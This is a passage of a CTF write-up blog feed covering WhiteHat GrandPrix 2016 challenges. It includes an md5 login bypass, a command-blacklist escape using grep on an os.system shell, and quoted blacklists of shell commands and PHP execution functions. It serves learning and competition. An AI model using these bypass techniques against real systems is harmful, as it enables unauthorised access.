<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/ruby</span></div><div class="line"></div><div class="line">(<span class="number">1</span>..<span class="number">30</span>).each <span class="keyword">do</span> <span class="params">|num|</span></div><div class="line">	raw_flag = File.read(<span class="string">'flag'</span>+num.to_s+<span class="string">'.txt'</span>)</div><div class="line">	<span class="comment"># Not sanitized flags</span></div><div class="line">	puts <span class="string">'raw: '</span>.concat(raw_flag)</div><div class="line">	only_flag = raw_flag.match(<span class="regexp">/\&#123;([a-z0-9]&#123;33&#125;)\&#125;/</span>).captures[<span class="number">0</span>]</div><div class="line">	<span class="comment"># Sanitized flags</span></div><div class="line">	puts only_flag.gsub(<span class="regexp">/[^0-9a-fA-F]/</span>, <span class="string">''</span>)</div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<p><strong>Note</strong>: CTF orga team should test challenges and remove the crappy ones before let teams have pain with them.</p>
<h2 id="submit">Submit</h2>
<p><img src="http://i.imgur.com/qdWgxcB.jpg" alt=""></p>
<p>And we also get one of the 23 parts of the puzzle:</p>
<p><img src="http://i.imgur.com/N6ZHerV.png" alt=""></p>
<p>This is for the <em>Discovering Vietnam</em> bonus challenge. It is a puzzle of 23 parts, you need them to get a QR-code that give a flag. Flag will give 10% bonus points of the current score.</p>
<p>I think we need to do almost all challenges to get all the pieces.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>WhiteHat GrandPrix - 100 - Banh bot loc - Web</title>
    <link href="http://rawsec.ml/en/WhiteHat-GrandPrix-2016-web-100-banh-bot-loc/"/>
    <id>http://rawsec.ml/en/WhiteHat-GrandPrix-2016-web-100-banh-bot-loc/</id>
    <published>2016-12-16T23:00:00.000Z</published>
    <updated>2017-02-07T18:23:36.722Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : WhiteHat GrandPrix 2016</li>
<li><strong>Website</strong> : <a href="https://grandprix.whitehatvn.com/Contests/ChallengesContest/32" target="_blank" rel="external">grandprix.whitehatvn.com</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/398" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="description">Description</h3>
<blockquote>
<p><a href="http://web05.grandprix.whitehatvn.com" target="_blank" rel="external">http://web05.grandprix.whitehatvn.com</a></p>
<p><a href="http://bakweb05.grandprix.whitehatvn.com:8125" target="_blank" rel="external">http://bakweb05.grandprix.whitehatvn.com:8125</a></p>
</blockquote>
<h2 id="solution">Solution</h2>
<p>Here is the home page:</p>
<p><img src="http://i.imgur.com/r2BGme3.png" alt=""></p>
<p>The login link go to <code>http://web05.grandprix.whitehatvn.com/index.php?username=guest&amp;password=guest</code> and says <code>noob</code>.</p>
<p><img src="http://i.imgur.com/w7FZJ9a.png" alt=""></p>
<p>Let's see source code of teh web page:</p>
<p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'index.php?username=guest&amp;password=guest'</span>&gt;</span>login<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span>Login to get our secret<span class="tag">&lt;/<span class="name">html</span>&gt;</span></div><div class="line"><span class="comment">&lt;!-- index.php.bak --&gt;</span></div></pre></td></tr></table></figure></p>
<p>Ok, let's see <code>index.php.bak</code>:</p>
<p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checklogin</span><span class="params">($username, $password, $key, $secret)</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>($username.$key == md5($password))</div><div class="line">		<span class="keyword">echo</span> $secret;</div><div class="line">	<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"noob"</span>;</div><div class="line">    &#125;</div><div class="line">$key = <span class="string">"1337"</span>;</div><div class="line">$secret = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;html&gt;</span></div><div class="line">    &lt;title&gt;hello&lt;/title&gt;</div><div class="line">    &lt;body&gt;</div><div class="line">    &lt;a href='index.php?username=guest&amp;password=guest'&gt;login&lt;/a&gt;&lt;br&gt;</div><div class="line">    &lt;/body&gt;";</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))</div><div class="line">    &#123;</div><div class="line">        checklogin($_GET[<span class="string">'username'</span>],$_GET[<span class="string">'password'</span>],$key,$secret);</div><div class="line">        <span class="keyword">die</span>(<span class="number">0</span>);</div><div class="line">    &#125;</div><div class="line"><span class="keyword">echo</span> <span class="string">"Login to get our secret"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/html&gt;"</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>Ok so the login checks that the concatenation of the username and the key is equal to the md5 hash of the password.</p>
<p>So we need to find a hash like <code>????????????????????????????1337</code> (28 random hex chars and 1337).</p>
<p>I first thought to download a md5 hash dictionary but I didn't wanted to wait during teh download.</p>
<p>So I went to <a href="https://md5db.net/explore/0000" target="_blank" rel="external">md5db.net</a> and looked for a hash beginning with <code>0000</code>, did a <code>CTRL + F</code> to find <code>1337</code> and finaly found <a href="https://md5db.net/view/0000dd456d15560290351cb4e6311337" target="_blank" rel="external">one</a>: <strong>#</strong> <em>13381</em> <strong>Hash</strong> <em>0000dd456d15560290351cb4e6311337</em> <strong>Word</strong> <em>hdtfz</em>.</p>
<p>So we get:</p>
<ul>
<li>username: <code>0000dd456d15560290351cb4e631</code></li>
<li>key: <code>1337</code></li>
<li>password: <code>hdtfz</code></li>
</ul>
<p>I submited the url: <a href="http://web05.grandprix.whitehatvn.com/index.php?username=0000dd456d15560290351cb4e631&amp;password=hdtfz" target="_blank" rel="external">http://web05.grandprix.whitehatvn.com/index.php?username=0000dd456d15560290351cb4e631&amp;password=hdtfz</a> and got the flag <code>WhiteHat{92ab818618fee438a1ea3944b5940237975f2b1d}</code>.</p>
<p><img src="http://i.imgur.com/YxrFXdq.png" alt=""></p>
<h2 id="submit">Submit</h2>
<p><img src="http://i.imgur.com/aFTxLvH.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>WhiteHat GrandPrix - 100 - Banh da Ke - Misc</title>
    <link href="http://rawsec.ml/en/WhiteHat-GrandPrix-2016-misc-100-Banh-da-Ke/"/>
    <id>http://rawsec.ml/en/WhiteHat-GrandPrix-2016-misc-100-Banh-da-Ke/</id>
    <published>2016-12-16T23:00:00.000Z</published>
    <updated>2017-02-07T18:23:36.732Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : WhiteHat GrandPrix 2016</li>
<li><strong>Website</strong> : <a href="https://grandprix.whitehatvn.com/Contests/ChallengesContest/32" target="_blank" rel="external">grandprix.whitehatvn.com</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/398" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="description">Description</h3>
<blockquote>
<p>When you gather all part of flag. Let's submit: WhiteHat{SHA1(flag)}</p>
<p>nc <a href="http://misc04.grandprix.whitehatvn.com" target="_blank" rel="external">misc04.grandprix.whitehatvn.com</a> 23403</p>
<p>nc <a href="http://bakmisc04.grandprix.whitehatvn.com" target="_blank" rel="external">bakmisc04.grandprix.whitehatvn.com</a> 23403</p>
<p><a href="http://material.grandprix.whitehatvn.com/gp2016/Misc04_be5358f2cb135ae9a38665a0d5ff199fc4fabb47.zip" target="_blank" rel="external">http://material.grandprix.whitehatvn.com/gp2016/Misc04_be5358f2cb135ae9a38665a0d5ff199fc4fabb47.zip</a></p>
<p><a href="http://bakmaterial.grandprix.whitehatvn.com/gp2016/Misc04_be5358f2cb135ae9a38665a0d5ff199fc4fabb47.zip" target="_blank" rel="external">http://bakmaterial.grandprix.whitehatvn.com/gp2016/Misc04_be5358f2cb135ae9a38665a0d5ff199fc4fabb47.zip</a></p>
<p>Alternative server on amazon in case of low traffic:</p>
<p><a href="http://54.183.97.137/gp2016/Misc04_be5358f2cb135ae9a38665a0d5ff199fc4fabb47.zip" target="_blank" rel="external">http://54.183.97.137/gp2016/Misc04_be5358f2cb135ae9a38665a0d5ff199fc4fabb47.zip</a></p>
</blockquote>
<p>create_folder_player.py</p>
<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> random</div><div class="line"></div><div class="line">flag = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"</span></div><div class="line">count = <span class="number">0</span></div><div class="line">length = len(flag)</div><div class="line"><span class="keyword">print</span> length</div><div class="line"></div><div class="line">arr = random.sample(range(<span class="number">0</span>,<span class="number">10000</span>),length)</div><div class="line">arr = sorted(arr)</div><div class="line"></div><div class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10000</span>):</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        os.mkdir(str(k))</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">if</span> k <span class="keyword">in</span> arr:</div><div class="line">        f=open(<span class="string">"./"</span>+str(k)+<span class="string">"/"</span>+os.urandom(<span class="number">8</span>).encode(<span class="string">"hex"</span>)+<span class="string">"."</span>+os.urandom(<span class="number">8</span>).encode(<span class="string">"hex"</span>),<span class="string">"w"</span>).write(str(flag[count]))</div><div class="line">        count +=<span class="number">1</span></div></pre></td></tr></table></figure></p>
<p><a href="http://mics.py" target="_blank" rel="external">mics.py</a></p>
<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> sys</div><div class="line">blaclist = <span class="string">"cat|nano|less|tail|vim|head|apt|install|wget|more|emacs|vi|subl|pico|bash|sh|rm|sed|nl|flag.hihi|`|%|\$|chmod|python"</span></div><div class="line"></div><div class="line">myregrex = <span class="string">"\W*(?i)("</span>+blaclist+<span class="string">")\W*"</span></div><div class="line">cmd = <span class="string">""</span></div><div class="line"><span class="keyword">while</span>(cmd != <span class="string">"exit"</span>):</div><div class="line">    sys.stdout.write(<span class="string">"Input your command: \n"</span>)</div><div class="line">    sys.stdout.flush()</div><div class="line">    cmd = raw_input()</div><div class="line">    check = re.findall(myregrex,cmd)</div><div class="line">    <span class="keyword">if</span> check!=[]:</div><div class="line">        sys.stdout.write(<span class="string">"rejected\n"</span>)</div><div class="line">        sys.stdout.flush()</div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="comment">#call()</span></div><div class="line">        a =<span class="string">"XXXXXXXXXXXXX"</span></div><div class="line">        a+=cmd</div><div class="line">        os.system(a)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        sys.stdout.write(<span class="string">"bad command\n"</span>)</div><div class="line">        sys.stdout.flush()</div></pre></td></tr></table></figure></p>
<h2 id="solution">Solution</h2>
<ul>
<li><code>create_folder_player.py</code>: there will be 10000 folders with one part of the flag in several of them choosen randomly.</li>
<li><code>misc.py</code>: lol, the spell. <code>blaclist</code> vs <code>blacklist</code>.</li>
<li><code>misc.py</code>: ok seriously, blacklist usage sucks so I wont do a script to send a <code>ls</code> for the all 10000 folders. I will simply find a command not blacklisted: <code>grep</code>.</li>
<li><code>grep</code> is magic, you can use all kind of regex and use it recursively:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">Input your command:</div><div class="line">grep -r -E &apos;*.*&apos; .</div><div class="line">./5256/7e8e1adc2c27d5ae.b20d7fe2eeee83a6:e</div><div class="line">./5363/049185c04d8d4a6a.14b749db725281b6:p</div><div class="line">./9149/e60247d6e9b86d66.538088287218f418:h</div><div class="line">./6625/99c4b89e33717d68.4e7cfddc3ab792ab:m</div><div class="line">./2961/af1fa87c94746adc.4ceba2ad4425295a:H</div><div class="line">./5360/3b1d1d39b7cdfc5e.b3d700c19f7da568:3</div><div class="line">./7520/be92bc1c03188333.8a0acf56d05e21f2:D</div><div class="line">./9460/0990eb1ff5a0f0f4.2b8448627eda707d:4</div><div class="line">./7261/85c5e9b11412182b.c8aa64a3e89d6116:4</div><div class="line">./4464/bfb49af4d0d18330.0e0a92989ea0cd16:&#123;</div><div class="line">./8447/1383404de7cf99d1.801ee7e580554bf7:r</div><div class="line">./9817/abb9dad1b91251c0.8aca51ae85b0a5a3:&#125;</div><div class="line">./2464/91001f84e6b7043c.362d39207f7113d5:e</div><div class="line">./6089/0da7f2cf81b578bc.64aceb97e90d59b8:4</div><div class="line">./7265/0d1d93183a71652c.f62fd332e6a893c7:n</div><div class="line">./8042/45b7f42e37a7036d.4649801c191cd850:t</div><div class="line">./8566/eb0eac89c6af6941.a01ee5abd0018d64:y</div><div class="line">./1490/ce66a0652ef071e2.8e59cb623f5044db:i</div><div class="line">./3391/d5bb02174118cd0a.8452e896dc972780:a</div><div class="line">./9729/ff958bf095684403.ba220df0c0a00cbc:d</div><div class="line">./5627/39835fcae4e0fb1e.d63a2b4f7cd6cc4d:_</div><div class="line">./5754/01b98e405d1a6f5e.dfea13f68bf1d28c:c</div><div class="line">./2124/0388bdb00dff778b.cf361e5e8cba7330:t</div><div class="line">./8919/8b998e1b2d84792e.05c56576bc8a640c:_</div><div class="line">./251/01fbe27318a591b2.32905c5f1c5d5be2:W</div><div class="line">./6805/421c3e7b161f09e6.cb2d792b88d852d3:_</div><div class="line">./7615/40672c2915963dc7.23d290b7ab5a23fe:_</div><div class="line">./4983/29a3e67904c136c1.82698942425d3172:k</div><div class="line">./4091/5d4d11679777c463.54a739cf22f2147f:t</div><div class="line">./1477/76ed9a66da76f47c.fffc5ebba341f304:h</div><div class="line">./6428/4ab16af8f7bea2ca.f326ac02efddd099:l</div><div class="line">./9664/3a309f1c601603e8.949523481193df68:r</div></pre></td></tr></table></figure></p>
<ul>
<li>Save the output in a text file.</li>
<li>Let's order that with a ruby script:</li>
</ul>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/ruby</span></div><div class="line"></div><div class="line">arr = []</div><div class="line"></div><div class="line">File.open(<span class="string">'misc04.txt'</span>).each <span class="keyword">do</span> <span class="params">|line|</span></div><div class="line">    <span class="comment"># math the folderName, fileName and content of each file (one char)</span></div><div class="line">    regex = line.match(<span class="regexp">/\/([0-9]&#123;1,4&#125;)\/([a-f0-9]&#123;16&#125;\.[a-f0-9]&#123;16&#125;):(.)/</span>)</div><div class="line">    folderName = regex.captures[<span class="number">0</span>]</div><div class="line">    fileName = regex.captures[<span class="number">1</span>]</div><div class="line">    char = regex.captures[<span class="number">2</span>]</div><div class="line">    <span class="comment"># convert folderName to int in order to be able to sort it the right way. Sort as int (2464 &gt; 251), sort a string (2464 &lt; 251).</span></div><div class="line">    arr.push([folderName.to_i,fileName,char])</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment"># sort by first col, so sort by fileName</span></div><div class="line">arr.sort!</div><div class="line"><span class="comment"># display only chars (third column of each row)</span></div><div class="line">arr.each&#123;<span class="params">|r|</span> print r[<span class="number">2</span>]&#125;</div></pre></td></tr></table></figure></p>
<ul>
<li>Execute it:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]–––––––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016]</div><div class="line">$ ruby sorted.rb</div><div class="line">WhiteHat&#123;ke3p_c4lm_4nD_try_h4rd&#125;</div></pre></td></tr></table></figure></p>
<ul>
<li>Format the flag (WhiteHat{SHA1(flag)}):</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]–––––––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016]</div><div class="line">$ printf %s &apos;WhiteHat&#123;ke3p_c4lm_4nD_try_h4rd&#125;&apos; | sha1sum</div><div class="line">1a05093adb0795d8e2f5b89985c43b85bcb11d19  -</div></pre></td></tr></table></figure></p>
<ul>
<li>Submt the flag <code>WhiteHat{1a05093adb0795d8e2f5b89985c43b85bcb11d19}</code>.</li>
</ul>
<h2 id="submit">Submit</h2>
<p><img src="http://i.imgur.com/9wgmKeY.jpg" alt=""></p>
<p>Another piece of the puzzle:</p>
<p><img src="http://i.imgur.com/wfuiArQ.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="misc" scheme="http://rawsec.ml/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>WhiteHat GrandPrix - 100 - Banh can - Web</title>
    <link href="http://rawsec.ml/en/WhiteHat-GrandPrix-2016-web-100-banh-can/"/>
    <id>http://rawsec.ml/en/WhiteHat-GrandPrix-2016-web-100-banh-can/</id>
    <published>2016-12-16T23:00:00.000Z</published>
    <updated>2017-02-07T18:23:36.722Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : WhiteHat GrandPrix 2016</li>
<li><strong>Website</strong> : <a href="https://grandprix.whitehatvn.com/Contests/ChallengesContest/32" target="_blank" rel="external">grandprix.whitehatvn.com</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/398" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="description">Description</h3>
<blockquote>
<p><a href="http://web04.grandprix.whitehatvn.com" target="_blank" rel="external">http://web04.grandprix.whitehatvn.com</a></p>
<p><a href="http://bakweb04.grandprix.whitehatvn.com:8118" target="_blank" rel="external">http://bakweb04.grandprix.whitehatvn.com:8118</a></p>
<p>Powered by People Security Academic - PSA</p>
</blockquote>
<h2 id="solution">Solution</h2>
<p><strong>TL;DR</strong>: Incomplete write-up.</p>
<p>Here is the home page:</p>
<p><img src="http://i.imgur.com/OZw8nP1.png" alt=""></p>
<p>Check the source code:</p>
<p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">What's your name? I just want to say hello :)</div><div class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"hello"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>Send<span class="tag">&lt;/<span class="name">button</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!-- function hint() --&gt;</span></div></pre></td></tr></table></figure></p>
<p>So let's try the hint function: <code>http://web04.grandprix.whitehatvn.com/?hint=</code>.</p>
<p><img src="http://i.imgur.com/kJVzdOH.png" alt=""></p>
<p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$blacklist = <span class="keyword">array</span>(<span class="string">"system"</span>, <span class="string">"passthru"</span>, <span class="string">"exec"</span>, <span class="string">"read"</span>, <span class="string">"open"</span>, <span class="string">"eval"</span>, <span class="string">"backtick"</span>, <span class="string">"`"</span>, <span class="string">"_"</span>);</div><div class="line"></div><div class="line"><span class="keyword">die</span>(<span class="string">"No no no hackers!!"</span>);</div></pre></td></tr></table></figure></p>
<h2 id="submit">Submit</h2>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>WhiteHat GrandPrix - 300 - Banh it la gai - Forensics</title>
    <link href="http://rawsec.ml/en/WhiteHat-GrandPrix-2016-forensics-300-Banh-it-la-gai/"/>
    <id>http://rawsec.ml/en/WhiteHat-GrandPrix-2016-forensics-300-Banh-it-la-gai/</id>
    <published>2016-12-16T23:00:00.000Z</published>
    <updated>2017-02-07T18:23:36.722Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : WhiteHat GrandPrix 2016</li>
<li><strong>Website</strong> : <a href="https://grandprix.whitehatvn.com/Contests/ChallengesContest/32" target="_blank" rel="external">grandprix.whitehatvn.com</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/398" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="description">Description</h3>
<blockquote>
<p>Submit: WhiteHat{SHA1(flag)}</p>
<p><a href="http://material.grandprix.whitehatvn.com/gp2016/For02_3603cb82230e3f6eb669a65f455e92b74659c2cc.zip" target="_blank" rel="external">http://material.grandprix.whitehatvn.com/gp2016/For02_3603cb82230e3f6eb669a65f455e92b74659c2cc.zip</a></p>
<p><a href="http://bakmaterial.grandprix.whitehatvn.com/gp2016/For02_3603cb82230e3f6eb669a65f455e92b74659c2cc.zip" target="_blank" rel="external">http://bakmaterial.grandprix.whitehatvn.com/gp2016/For02_3603cb82230e3f6eb669a65f455e92b74659c2cc.zip</a></p>
<p>Alternative server on amazon in case of low traffic:</p>
<p><a href="http://54.183.97.137/gp2016/For02_3603cb82230e3f6eb669a65f455e92b74659c2cc.zip" target="_blank" rel="external">http://54.183.97.137/gp2016/For02_3603cb82230e3f6eb669a65f455e92b74659c2cc.zip</a></p>
</blockquote>
<h2 id="solution">Solution</h2>
<p><strong>TL;DR</strong>: incomplete write-up.</p>
<ul>
<li>Download the zip.</li>
<li>Extract it.</li>
<li>We have a raw image.</li>
<li>Let's see what we can do with Volatility:</li>
</ul>
